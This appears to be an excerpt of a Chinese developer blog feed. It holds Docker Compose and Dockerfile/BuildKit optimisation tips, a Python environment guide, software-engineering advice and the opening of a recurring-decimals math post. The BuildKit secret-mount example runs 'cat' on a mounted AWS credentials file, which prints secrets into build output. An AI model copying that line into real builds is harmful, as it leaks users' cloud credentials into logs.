中定义的服务。<br><strong>作用</strong>：构建镜像（如果需要），并启动所有的服务。启动后，所有服务会在前台显示日志，直到你停止它们。<br>-d：在后台启动容器（detached mode）。<br>–build：强制重新构建镜像。</li><li><strong>docker-compose down</strong> 删除所有容器，并且会删除由 Compose 创建的网络。<br>–volumes：同时删除与容器关联的持久化数据卷。</li><li><strong>docker-compose build</strong> 命令用于显式地构建所有服务的镜像，而不启动容器。<br>–no-cache：不使用缓存，强制重新构建镜像。<br>–pull：在构建时拉取最新的基础镜像。</li><li><strong>docker-compose run</strong> 命令用于在一个特定的服务上运行一个命令，通常适用于需要交互式调试或运行一次性任务的场景。它只会启动你指定的服务，而不是整个 docker-compose.yml 中的所有服务。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose run --<span class="built_in">rm</span> prompt-engine python /prompt-engine/src/main.py -fpath projects/data -<span class="built_in">id</span> 1234 -cmd detect -o output/result.xlsx</span><br></pre></td></tr></table></figure>–rm：在命令执行完毕后自动删除容器，这对于命令行工具或一次性运行的任务非常有用。<br>-d：后台运行容器，适合需要持久运行的服务（但不适合一次性任务）。</li><li><strong>docker-compose start 和 docker-compose stop</strong> 这些命令用于启动和停止已经存在的服务容器。</li><li><strong>docker-compose exec</strong> 命令允许你进入正在运行的容器，执行命令或者开启交互式终端。它类似于 docker exec，但在 Docker Compose 环境中使用。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose <span class="built_in">exec</span> prompt-engine bash</span><br></pre></td></tr></table></figure></li><li>docker-compose config 来查看 Compose 文件中定义的环境变量和配置。</li></ul><h1>最佳实践</h1><h2 id="常规加快构建">常规加快构建</h2><p><strong>选择合适的基础镜像</strong>。基础镜像的选择对镜像大小和应用性能影响很大。通常建议选择精简版镜像，如 python:3.9-slim 或 alpine，以减小镜像大小，减少冗余的包依赖。镜像的东西越少，安全漏洞越少。</p><p><strong>使用多阶段构建</strong>。这个参考前面的章节。</p><p><strong>避免不必要的层</strong>。因为每一层都是有缓存的，层越多，复杂性极速上升。一般来说做法如下：</p><ul><li><p>合并要执行的 shell 命令，并且在执行完命令后删除不必要的缓存和依赖。</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不优化的写法：每个 RUN 都会创建一个新层</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y curl</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y git</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">rm</span> -rf /var/lib/apt/lists/*  <span class="comment"># 清理缓存</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 优化的写法：合并到一个 RUN 中，只创建一个层</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install -y curl git &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">rm</span> -rf /var/lib/apt/lists/*</span></span><br></pre></td></tr></table></figure></li><li><p>Copy 指令越少越好，合并起来，而且只 copy 必要的文件。</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不优化的写法：每个 COPY 都会创建一个新层</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> file1.py /app/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> file2.py /app/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 优化的写法：合并到一个 COPY 指令，减少层数</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> file1.py file2.py /app/</span></span><br></pre></td></tr></table></figure></li><li><p>**将不常变动的依赖放在前面。**Docker 使用分层缓存，如果某一层没有变化，Docker 会重用缓存层。将依赖安装、基础配置等不常变化的指令放在 Dockerfile 的前面，而将代码的 COPY 操作放在后面，这样可以避免每次修改代码时重新安装依赖。</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先安装依赖（通常不变动）</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> requirements.txt .</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip install --no-cache-dir -r requirements.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 再复制应用代码（经常变化）</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . .</span></span><br></pre></td></tr></table></figure></li><li><p>**使用 --no-install-recommends 安装软件包。**使用 apt-get install 时，默认会安装许多推荐包（recommends），但这些推荐包可能并不是必要的。通过 --no-install-recommends 选项，你可以避免安装不需要的软件包。</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install -y --no-install-recommends curl git &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">rm</span> -rf /var/lib/apt/lists/*</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="使用BuildKit">使用<strong>BuildKit</strong></h2><h3 id="额外缓存">额外缓存</h3><p><a href="https://yeasy.gitbook.io/docker_practice/buildx/buildkit">BuildKit | Docker — 从入门到实践</a></p><p>手动增加缓存数据，除了 volumes 这种持久化的给挂载给容器的数据，还有一些用于加速构建的特殊缓存设置。这些缓存执行完命令就会卸载，因此不会增加容器大小。并且缓存还会自动的更新。</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm i --registry=https://registry.npm.taobao.org \</span></span><br><span class="line"><span class="language-bash">        &amp;&amp; <span class="built_in">rm</span> -rf ~/.npm</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm run build</span></span><br><span class="line"><span class="comment"># 改造成：</span></span><br><span class="line"><span class="comment"># syntax = docker/dockerfile:experimental</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> --mount=<span class="built_in">type</span>=cache,target=/app/node_modules,<span class="built_in">id</span>=my_app_npm_module,sharing=locked \</span></span><br><span class="line"><span class="language-bash">    --mount=<span class="built_in">type</span>=cache,target=/root/.npm,<span class="built_in">id</span>=npm_cache \</span></span><br><span class="line"><span class="language-bash">        npm i --registry=https://registry.npm.taobao.org</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> --mount=<span class="built_in">type</span>=cache,target=/app/node_modules,<span class="built_in">id</span>=my_app_npm_module,sharing=locked \</span></span><br><span class="line"><span class="language-bash"><span class="comment"># --mount=type=cache,target=/app/dist,id=my_app_dist,sharing=locked \</span></span></span><br><span class="line"><span class="language-bash">        npm run build</span></span><br></pre></td></tr></table></figure><p>以上的改变，在执行每个 RUN 的时候，都会挂载缓存数据到 target 目录，然后再去执行。</p><p>在多阶段构建的时候，还有特殊优化，用于获取上一次构建产生的缓存，而不是直接 COPY。这和使用 id 标识缓存的用途是不一样的，但是实际效果差不多。</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> --mount=<span class="built_in">type</span>=cache,target=/tmp/dist,from=builder,<span class="built_in">source</span>=/app/dist \</span></span><br></pre></td></tr></table></figure><h3 id="传递多级构建的产物">传递多级构建的产物</h3><p>类似这样的代码，多级构建的时候可以挂载上一级的产物。和 cache 的区别在于，它不会缓存。</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># syntax = docker/dockerfile:experimental</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> --mount=<span class="built_in">type</span>=<span class="built_in">bind</span>,from=php:alpine,<span class="built_in">source</span>=/usr/local/bin/docker-php-entrypoint,target=/docker-php-entrypoint \</span></span><br><span class="line"><span class="language-bash">        <span class="built_in">cat</span> /docker-php-entrypoint</span></span><br></pre></td></tr></table></figure><h3 id="优化-IO-密集的临时操作">优化 IO 密集的临时操作</h3><p>tmpfs 是一种基于内存的文件系统，数据存储在 RAM（随机存取存储器）中，而不是持久存储设备（如硬盘）。在 Linux 系统中，/tmp 目录通常使用 tmpfs。</p><p>那么构建过程中有很多的临时数据读写，而且不大（不超过物理内存的一半），执行完了就不需要，那么就比较时候。</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> --mount=<span class="built_in">type</span>=tmpfs,target=/tmpfs \</span></span><br><span class="line"><span class="language-bash">    tar -xzf large-file.tar.gz -C /tmpfs &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> -r /tmpfs/some-folder /app/some-folder</span></span><br></pre></td></tr></table></figure><p>一般的场景有：</p><ul><li><strong>编译中间文件</strong>：如果在构建过程中有些中间文件（如编译产物）只需要暂时存储，且不需要在构建结束后保留，tmpfs 是很好的选择。Rust 就很多的那种 target 中间文件。</li><li><strong>解压缩与临时数据处理</strong>：先把数据解压到 tmpfs，然后再使用。或者下载到 tmpfs，再操作。</li></ul><p>这也是许多脚本选择下载和解压的位置是 <code>/tmp</code> 的原因。</p><h3 id="挂载密钥文件">挂载密钥文件</h3><p>这个的特点就是，不会缓存，执行 RUN 结束之后就消失了。它的特点就是，这个文件处于隐私文件系统，构建的时候安全性更高。</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># syntax = docker/dockerfile:experimental</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> --mount=<span class="built_in">type</span>=secret,<span class="built_in">id</span>=aws,target=/root/.aws/credentials \</span></span><br><span class="line"><span class="language-bash">        <span class="built_in">cat</span> /root/.aws/credentials</span></span><br></pre></td></tr></table></figure><p>构建的时候要提供密钥： <code>docker build --secret id=aws,src=$HOME/.aws/credentials -t my-app .</code></p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">services:</span><br><span class="line">  app:</span><br><span class="line">    build:</span><br><span class="line">      context: .</span><br><span class="line">      dockerfile: Dockerfile</span><br><span class="line">      secrets:</span><br><span class="line">        - aws_credentials  <span class="comment"># 用于构建阶段</span></span><br><span class="line">    secrets:</span><br><span class="line">      - aws_credentials     <span class="comment"># 用于运行时，默认在/run/secrets/</span></span><br></pre></td></tr></table></figure><aside>💡<p>最后的建议：多去看优秀的开源项目的配置</p></aside>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1&gt;了解背景&lt;/h1&gt;
&lt;p&gt;Docker 是一种轻量级的容器化技术，主要用于&lt;strong&gt;应用程序的环境迁移和一致性&lt;/strong&gt;</summary>
        
      
    
    
    
    <category term="developer" scheme="https://www.blog-blockchain.xyz/categories/developer/"/>
    
    
    <category term="developer" scheme="https://www.blog-blockchain.xyz/tags/developer/"/>
    
  </entry>
  
  <entry>
    <title>(一）Python环境配置指南</title>
    <link href="https://www.blog-blockchain.xyz/dev/python-env/"/>
    <id>https://www.blog-blockchain.xyz/dev/python-env/</id>
    <published>2024-10-21T03:18:20.000Z</published>
    <updated>2024-11-18T09:44:55.564Z</updated>
    
    <content type="html"><![CDATA[<h1>管理 Python 版本</h1><p>推荐使用 <a href="https://github.com/pyenv/pyenv">https://github.com/pyenv/pyenv</a> 来管理不同版本的 python，但是它不支持 windows，如果你使用 windows，请使用 <a href="https://github.com/pyenv-win/pyenv-win">https://github.com/pyenv-win/pyenv-win</a> 。</p><p>如果你需要使用特定版本的 python，先安装它，类似于</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyenv install 3.9.6</span><br></pre></td></tr></table></figure><p>随后在项目的根目录，使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyenv <span class="built_in">local</span> 3.9.6</span><br></pre></td></tr></table></figure><p>它会生成一个配置文件 <code>.python-version</code> ，就会让进入项目根目录，就会自动切换到 3.9.6 的版本。</p><h1>管理虚拟环境</h1><p><strong>Poetry</strong> 适合现代 Python 项目开发、个人或小型团队开发、需要发布到 PyPI 的项目。</p><p><strong>特点</strong>：</p><ul><li><strong>自动化依赖管理</strong>：Poetry 能够自动处理依赖冲突，生成 pyproject.toml 和 poetry.lock 文件，确保依赖一致性。</li><li><strong>内置虚拟环境管理</strong>：Poetry 会自动为每个项目创建虚拟环境，隔离项目依赖，保证项目间的互不干扰。</li><li><strong>简化的发布流程</strong>：通过 poetry build 和 poetry publish，可以轻松地将 Python 包发布到 PyPI。</li><li><strong>现代化设计</strong>：Poetry 支持 pyproject.toml，这是 Python 最新的标准配置文件格式。</li></ul><p>优点：</p><ul><li>统一的依赖管理和虚拟环境管理，操作简单。</li><li>自动解决依赖冲突，生成锁定文件，保证不同环境依赖的一致性。</li><li>提供项目的创建、构建、依赖管理、测试和发布的全流程工具。</li><li>pyproject.toml 文件非常清晰，方便配置。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">poetry new my_project      <span class="comment"># 创建新项目</span></span><br><span class="line">poetry add requests        <span class="comment"># 添加依赖</span></span><br><span class="line">poetry install             <span class="comment"># 安装依赖</span></span><br><span class="line">poetry shell               <span class="comment"># 进入虚拟环境</span></span><br><span class="line">poetry run python script.py <span class="comment"># 在虚拟环境外，使用虚拟环境运行脚本</span></span><br></pre></td></tr></table></figure><p>Poetry 对当前的 python 解释器有依赖。当你使用 Poetry 创建虚拟环境时，它会检查系统中当前使用的 Python 版本是否符合项目中的版本要求。如果当前系统或环境中的 Python 版本不符合 pyproject.toml 中的规定，Poetry 会提示错误，阻止虚拟环境的创建或依赖安装。报错类似 Poetry could not find a compatible version of python for your project.</p><p>为了弥补 Poetry 不能直接管理 Python 版本的缺点，你可以结合 pyenv 这类工具来一起使用。</p><p>以上 pyenv 会自动切换环境，这样就没有问题了。</p><hr><p>相比 conda，poetry 专注于依赖管理和包管理，适合纯 <strong>Python 项目</strong>。Conda 创建的虚拟环境是完全隔离的，每个环境可以有不同的 Python 版本和不同的依赖包，管理起来非常方便。</p><p>但是 Conda 在一些<strong>科学计算</strong>库上，有预编译的版本（如 numpy, scipy, pandas），Conda 可以直接安装预编译好的版本，避免本地编译的复杂性。<strong>尤其在 windows 平台，能解决许多依赖包编译失败的问题</strong>。</p><hr><p>关于 macOS(darwin)系统，它确实在用户体验上下了功夫，并且有类 unix 的系统。但是它的编译工具链，依赖库等生态，还是不如 linux，尤其是需要自行编译的部分，比如部分 python 的包，就会容易遇到各种 bug，需要手动解决，再加上 arm 架构，会进一步造成一些兼容性问题。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1&gt;管理 Python 版本&lt;/h1&gt;
&lt;p&gt;推荐使用 &lt;a href=&quot;https://github.com/pyenv/pyenv&quot;&gt;https://github.com/pyenv/pyenv&lt;/a&gt; 来管理不同版本的 python，但是它不支持 windows，如果你使用 windows，请使用 &lt;a href=&quot;https://github.com/pyenv-win/pyenv-win&quot;&gt;https://github.com/pyenv-win/pyenv-win&lt;/a&gt; </summary>
        
      
    
    
    
    <category term="developer" scheme="https://www.blog-blockchain.xyz/categories/developer/"/>
    
    
    <category term="developer" scheme="https://www.blog-blockchain.xyz/tags/developer/"/>
    
  </entry>
  
  <entry>
    <title>如何成为优秀的软件工程师</title>
    <link href="https://www.blog-blockchain.xyz/career/become-good-coder/"/>
    <id>https://www.blog-blockchain.xyz/career/become-good-coder/</id>
    <published>2024-10-08T18:44:20.000Z</published>
    <updated>2024-11-18T09:47:46.360Z</updated>
    
    <content type="html"><![CDATA[<p>要成为一名优秀的软件工程师，需要掌握广泛的技能和知识，包括基础的数据结构、高级架构设计和良好的编程实践。本文将为你详细介绍如何全面提升自己的编程能力，成为卓越的软件工程师。</p><h1>深入掌握数据结构与算法</h1><p>TODO: 我的数据结构和算法的笔记，每一类数据结构怎么用。</p><p>数据结构和算法是软件工程的核心基础。深入理解数组、链表、堆栈、队列、树、图等基础数据结构，可以帮助你高效地解决复杂问题。你不仅需要理解它们的工作原理，还要清楚它们的优缺点、本质特性以及适用的应用场景。</p><p><strong>数组</strong>是一种连续存储的结构，适合需要快速随机访问的场景，访问的时间复杂度为 O(1)。但它在插入和删除操作时需要移动大量数据，时间复杂度为 O(n)，因此不适合频繁插入和删除的场景。数组通常用于需要快速访问的应用，例如排行榜和固定大小的数据集合。</p><p><strong>链表</strong>是一种由节点组成的结构，每个节点包含数据和指向下一个节点的指针。链表在已知位置时，插入和删除操作非常高效，时间复杂度为 O(1)，但随机访问的效率较低，为 O(n)。链表适用于需要频繁插入和删除元素的场景，例如实现队列、内存管理的空闲块链表等。</p><p><strong>堆栈和队列</strong>是两种特殊的线性数据结构。堆栈遵循后进先出（LIFO）原则，适用于递归调用、撤销操作、函数调用栈管理等场景；队列遵循先进先出（FIFO）原则，适用于排队系统、任务调度和广度优先搜索（BFS）等场景，例如打印任务队列和操作系统的进程管理等。</p><p><strong>树</strong>是一种分层数据结构，常用于表示层级关系。树适用于需要快速查找、插入和删除的场景，例如数据库索引和文件系统目录结构。红黑树是一种自平衡二叉搜索树，广泛应用于 Java 的 TreeMap 和 Linux 内核中的调度器等。</p><p><strong>图</strong>是一种由节点和边组成的结构，适用于表示网络关系，如社交网络和计算机网络等。图的遍历方法，如深度优先搜索（DFS）和广度优先搜索（BFS），在路径查找和连通性分析等方面非常有用，例如社交平台中的好友推荐和地图应用中的最短路径计算。</p><p><strong>散列函数</strong>将输入映射到哈希表的固定位置，通过 HashMap 可以实现高效的数据存储和查找。哈希表平均情况下查找和插入的时间复杂度为 O(1)，但需要处理冲突问题（如链地址法和开放地址法）。哈希表适用于需要快速查找的场景，如缓存和数据索引。</p><p><strong>递归</strong>是一种函数调用自身的编程方法，适用于具有自相似性质的问题。递归用于解决分治类问题，例如目录树的遍历、二叉树的遍历等。递归可以让代码更加简洁，但需要注意栈溢出以及深度过大的问题。</p><p><strong>动态规划</strong>是一种优化递归的技术，适用于具有重叠子问题和最优子结构的问题。通过将子问题的结果存储起来，动态规划可以显著减少重复计算，提高算法效率。常见的应用包括最短路径问题、背包问题和最长公共子序列问题。</p><p>理解<strong>算法复杂度</strong>是优化代码的关键。时间复杂度衡量算法随输入规模变化的运行时间，空间复杂度衡量算法所需的存储空间。常见的时间复杂度有 O(1)、O(log n)、O(n) 等。选择合适的数据结构和算法可以显著提升程序效率。</p><p>通过增加存储空间来减少计算时间的策略被称为“<strong>空间换时间</strong>”。例如，使用缓存来避免重复计算，或者通过哈希表存储数据以实现快速查找。操作系统中的缓存机制是空间换时间的经典例子，例如内存中的页表缓存（TLB）用于加速虚拟地址到物理地址的转换，减少内存访问延迟。另外，数据库系统中通过将查询结果缓存到内存中，也可以加快后续相同查询的速度，这样可以显著提升系统性能。</p><p>通过不断应用这些数据结构和算法知识，你将能设计和实现高效的程序，解决各种复杂的工程问题。</p><h1>掌握设计模式</h1><p>在服务器开发中，良好的架构设计离不开各种设计模式的应用。下面是一些常见的设计模式及其应用场景：</p><p><strong>单例模式</strong>：用于确保某个服务实例在整个应用程序中仅有一个，例如数据库连接池、配置管理器等。在 Go 中，单例模式通常通过逐级初始化来实现，而非依赖包级别的全局变量，从而保持模块化，确保系统的可维护性和模块的独立性。同时，可以使用 <code>sync.Once</code> 来确保实例只被初始化一次，避免资源浪费。</p><p><strong>工厂模式</strong>：用于创建相似特性的对象，如网络协议中的 HTTP、WebSocket 或 gRPC 等。通过工厂模式，可以灵活生成不同类型的服务实例，以适应不同的业务逻辑需求。</p><p><strong>订阅-通知模式</strong>（原观察者模式）：在事件驱动系统中非常有用，例如聊天室中的消息推送机制。订阅-通知机制用于模块之间的通信。在以太坊中，交易池收到新交易后通知交易广播器，以避免重复广播已知交易。在 Go 中，可以利用通道（channel）实现订阅-通知模式。例如，可以创建一个通道来传递新交易信息，当交易池接收到新交易时，将交易信息发送到通道中，所有订阅该通道的模块（如交易广播器）都会接收到通知并执行相应操作。</p><p><strong>代理模式</strong>：用于在目标对象前后增加控制逻辑，例如权限控制、日志记录和缓存。在数据库访问中，代理模式可以在执行前检查用户权限，或者缓存查询结果以减少数据库访问频次。</p><p><strong>策略模式</strong>：适用于需要动态选择算法的场景，例如服务器的负载均衡。可以根据不同的条件选择最小连接数、轮询等策略来处理请求。</p><p><strong>消息调度模式</strong>：在处理请求和响应时，协调发送和接收是关键。消息调度模式中通常使用唯一的请求 ID 标识每个请求与响应，确保它们正确匹配。在消息调度系统中，通常会设置一个 <code>replyMatcher</code>，管理请求和响应的匹配关系，并在收到响应时通过回调函数进行处理。多个循环（如主循环和读取循环）协同工作，结合带缓冲区的共享变量来处理高并发任务，有效控制系统负载。</p><p><strong>上下文管理模式</strong>：用于在多线程或异步环境中管理请求的生命周期和相关信息。例如在 Go 中，可以使用 <code>context</code> 包来处理请求的超时、取消信号和元数据传递，使得系统更加健壮和易维护。</p><h1>良好的编程习惯与高效工具链</h1><p>TODO: 工具链部分，增加如何选择开源项目学习和二次开发。<br>TODO: git 的正确使用方法。</p><p>良好的编程习惯是成为优秀软件工程师的重要组成部分，以下几个方面可以帮助提高代码质量和开发效率：</p><p>熟练掌握以下主流工具和技能是每个优秀工程师的基本要求：</p><ul><li><strong>IDE</strong>：掌握使用主流的集成开发环境（如 VSCode、IntelliJ IDEA、GoLand），这些工具可以提高开发效率并提供强大的调试和代码补全功能。</li><li><strong>构建工具</strong>：熟悉构建工具（如 Make、Gradle、Cargo），它们可以帮助自动化编译、测试和打包，减少手动错误，提高开发效率。</li><li><strong>版本控制系统</strong>：精通版本控制系统（如 Git），能够熟练进行代码分支管理、合并冲突和版本发布，是团队协作开发的基本技能。</li><li><strong>Linux 系统操作</strong>：掌握 Linux 系统的操作，了解基本的命令行工具、脚本编写、文件权限管理等，是开发服务器端应用程序和进行系统维护的必备技能。</li></ul><p>在开发过程中，<strong>优先实现核心功能</strong>有助于快速构建项目的主干部分，确保最重要的功能得到充分测试和验证。不要陷入一些常见的误区，例如从自己喜欢的部分、熟悉的部分或看起来简单的部分入手，而是应该优先实现对产品功能最重要、关乎系统可用性的核心功能。通过首先实现关键功能，再逐步扩展其他细节，可以更好地控制项目进度，减少实现复杂系统时的分散和混乱。</p><p><strong>测试是保证软件质量的关键</strong>，尤其是核心功能的测试。逐步测试意味着在开发每个模块时及时进行单元测试，确保其功能符合预期。这样不仅可以在早期发现潜在问题，还可以为后续开发打下稳定的基础，减少后期调试的时间。</p><p>现实中的系统总会遇到各种异常情况。<strong>完善的异常处理</strong>不仅可以让程序在出现错误时保持稳定，还能提升用户体验。合理的异常处理包括捕获可能的错误、给出有意义的提示信息，以及在错误发生时优雅地降级处理，以保证系统的可用性。</p><p>编写代码的良好习惯：</p><ul><li><strong>代码简洁明了</strong>：编写简洁、易于理解的代码，避免过度复杂的逻辑。遵循“代码即文档”的原则，让代码本身易于阅读和维护。例如，如果有一个复杂的嵌套循环，可以将其拆分为几个小函数，每个函数只负责一个具体的步骤，这样可以提高代码的可读性和可维护性。</li><li><strong>一致的代码风格</strong>：遵守统一的代码风格和命名规范，保持代码的一致性，方便团队协作和代码审查。建议使用 linters 工具（如 ESLint、gofmt 等）来自动检测代码风格一致性，确保代码质量并减少人为错误。</li><li><strong>适当的注释</strong>：对重要的逻辑和复杂的实现进行适当的注释，帮助其他开发者理解代码的目的和思路。注释应当解释“为什么”做某件事，而非“如何”做。</li><li><strong>小函数和模块化设计</strong>：将代码分割成小函数和模块，确保每个函数和模块只完成一个职责（单一职责原则）。这样可以提高代码的可测试性和可维护性。</li><li><strong>代码审查</strong>：通过代码审查的方式，发现代码中的潜在问题，并通过团队合作提高代码质量。接受他人的反馈，并不断改进自己的编码习惯。</li><li><strong>谨慎处理全局状态</strong>：尽量减少或避免使用全局变量，以免引入难以追踪的错误。通过依赖注入等方式，将状态控制在合理的范围内，确保代码模块的独立性。</li><li><strong>资源管理</strong>：确保在使用完资源（如文件句柄、数据库连接等）后正确释放它们，以防止资源泄漏。使用 <code>defer</code> 等语言特性简化资源的清理操作。</li></ul><p>通过养成这些良好的编程习惯，可以提高代码的质量和可维护性，并减少在开发和维护过程中可能遇到的问题。</p><h1>总结</h1><p>成为一名优秀的软件工程师需要不断学习和实践，掌握基础的数据结构与算法，灵活应用各种设计模式，养成良好的编程习惯，并高效使用工具链。通过持续的努力和总结，你将逐步提升自己的技术能力，成为一名真正优秀的软件工程师。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;要成为一名优秀的软件工程师，需要掌握广泛的技能和知识，包括基础的数据结构、高级架构设计和良好的编程实践。本文将为你详细介绍如何全面提升自己的编程能力，成为卓越的软件工程师。&lt;/p&gt;
&lt;h1&gt;深入掌握数据结构与算法&lt;/h1&gt;
&lt;p&gt;TODO: 我的数据结构和算法的笔记，每一类数据结构怎么用。&lt;/p&gt;
&lt;p&gt;数据结构和算法是软件工程的核心基础。深入理解数组、链表、堆栈、队列、树、图等基础数据结构，可以帮助你高效地解决复杂问题。你不仅需要理解它们的工作原理，还要清楚它们的优缺点、本质特性以及适用的应用场景。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;数组&lt;/strong&gt;是一种连续存储的结构，适合需要快速随机访问的场景，访问的时间复杂度为 O(1)。但它在插入和删除操作时需要移动大量数据，时间复杂度为 O(n)，因此不适合频繁插入和删除的场景。数组通常用于需要快速访问的应用，例如排行榜和固定大小的数据集合。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;链表&lt;/strong&gt;是一种由节点组成的结构，每个节点包含数据和指向下一个节点的指针</summary>
        
      
    
    
    
    <category term="developer" scheme="https://www.blog-blockchain.xyz/categories/developer/"/>
    
    
    <category term="developer" scheme="https://www.blog-blockchain.xyz/tags/developer/"/>
    
  </entry>
  
  <entry>
    <title>Decimal Recurring Cycles and Cyclic Groups</title>
    <link href="https://www.blog-blockchain.xyz/math/Decimal-Recurring-Cycles%20and-Cyclic-Groups/"/>
    <id>https://www.blog-blockchain.xyz/math/Decimal-Recurring-Cycles%20and-Cyclic-Groups/</id>
    <published>2024-01-21T12:28:03.000Z</published>
    <updated>2024-11-15T14:30:54.925Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.blog-blockchain.xyz/2024/01/cd56c9ab47819ffe8a79fa857256a1ea.png" alt="image-20240122011802524"></p><h1>From the Perspective of Cyclic Groups</h1><h2 id="When-the-Denominator-and-10-are-Coprime">When the Denominator and 10 are Coprime</h2><p>The process of division is actually the calculation of <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mi>k</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">10^k \mod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span>, which is the remainder of the k-th division. When the remainder is 1, i.e., <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mi>k</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi 